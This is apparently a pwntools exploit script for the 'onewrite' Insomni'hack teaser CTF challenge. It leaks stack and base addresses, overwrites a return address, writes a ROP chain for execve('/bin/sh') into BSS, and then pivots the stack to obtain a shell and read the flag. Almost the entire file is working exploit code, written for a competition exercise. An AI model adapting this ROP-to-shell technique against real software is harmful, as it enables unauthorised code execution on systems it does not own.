from pwn import *
from struct import pack
import time

i = 0
context.log_level = "ERROR"
context.timeout = 600

def exp():
    global i
    rop = ''
    i = i + 1
    p = process("onewrite")
    #p = remote("onewrite.teaser.insomnihack.ch", 1337)
    #gdb.attach(p)

    def _leak(opt):
        p.sendlineafter(">", str(opt))
        return int(p.recvline()[:-1], 16)

    def _write(addr, content):
        p.sendafter(":", str(addr) + content)

    try:
        stack_ptr = _leak(1)
        print "Stack Pointer: " + hex(stack_ptr)
        # partially overwrite the last 2 bytes
        ret_addr = stack_ptr - 0x8
        # return to main function
        p.sendafter(":", str(ret_addr) + "\xb8\x2a")
        # new stack_ptr address
        stack_ptr = stack_ptr - 0x28
        # leak function address
        base_addr = _leak(2) - 0x8a15
        bss_addr = base_addr + 0x2b3328
        main_addr = base_addr + 0x8ab8
        print "Base Address: " + hex(base_addr)
        print "BSS Address: " + hex(bss_addr)
        print "main() Address: " + hex(main_addr)

        # ROP Generated By ropper
        IMAGE_BASE_0 = base_addr
        rebase_0 = lambda x : p64(x + IMAGE_BASE_0)
        rop += rebase_0(0x00000000000460ac) # 0x00000000000460ac: pop rax; ret;
        rop += '//bin/sh'
        rop += rebase_0(0x000000000000d9f2) # 0x000000000000d9f2: pop rsi; ret;
        rop += rebase_0(0x00000000002b1120)
        rop += rebase_0(0x0000000000077901) # 0x0000000000077901: mov qword ptr [rsi], rax; ret;
        rop += rebase_0(0x00000000000460ac) # 0x00000000000460ac: pop rax; ret;
        rop += p64(0x0000000000000000)
        rop += rebase_0(0x000000000000d9f2) # 0x000000000000d9f2: pop rsi; ret;
        rop += rebase_0(0x00000000002b1128)
        rop += rebase_0(0x0000000000077901) # 0x0000000000077901: mov qword ptr [rsi], rax; ret;
        rop += rebase_0(0x00000000000084fa) # 0x00000000000084fa: pop rdi; ret;
        rop += rebase_0(0x00000000002b1120)
        rop += rebase_0(0x000000000000d9f2) # 0x000000000000d9f2: pop rsi; ret;
        rop += rebase_0(0x00000000002b1128)
        rop += rebase_0(0x00000000000484c5) # 0x00000000000484c5: pop rdx; ret;
        rop += rebase_0(0x00000000002b1128)
        rop += rebase_0(0x00000000000460ac) # 0x00000000000460ac: pop rax; ret;
        rop += p64(0x000000000000003b)
        rop += rebase_0(0x000000000006e605) # 0x000000000006e605: syscall; ret;

        # Write ROP to BSS
        # The first write couldn't use following function
        # because the stack layout is affected by previous leak/write
        offset = 0 * 8
        _write(bss_addr + offset, rop[offset: offset + 8])
        stack_ptr = _leak(1)
        _write(stack_ptr - 8, p64(main_addr))
        stack_ptr = _leak(1)
        _write(stack_ptr - 8, p64(main_addr))

        print "Write Stage 1"

        def write_rop(i):
            offset = i * 8
            stack_ptr = _leak(1)
            _write(bss_addr + offset, rop[offset: offset + 8])
            stack_ptr = _leak(1)
            _write(stack_ptr - 8, p64(main_addr))
            stack_ptr = _leak(1)
            _write(stack_ptr - 8, p64(main_addr))

        for i in range(1, len(rop) / 8):
            write_rop(i)
            print "Now is: " + str(i)

        print "Write All"

        # trigger our ROP
        stack_ptr = _leak(1)
        print "RET Value: " + hex(stack_ptr + 0x38)
        _write(stack_ptr + 0x38, p64(base_addr + 0x946a))
        stack_ptr = _leak(1)
        print "RSP Addr: " + hex(stack_ptr + 0x20)
        _write(stack_ptr + 0x20, p64(bss_addr))
        print "Triggering ROP"

        p.sendline("cat flag")
        print p.recvline()
        sleep(0.5)
        p.sendline("cat /flag")
        print p.recvline()
        p.interactive()

    except:
        p.close()
        print "Trying: " + str(i)




while True:
    exp()
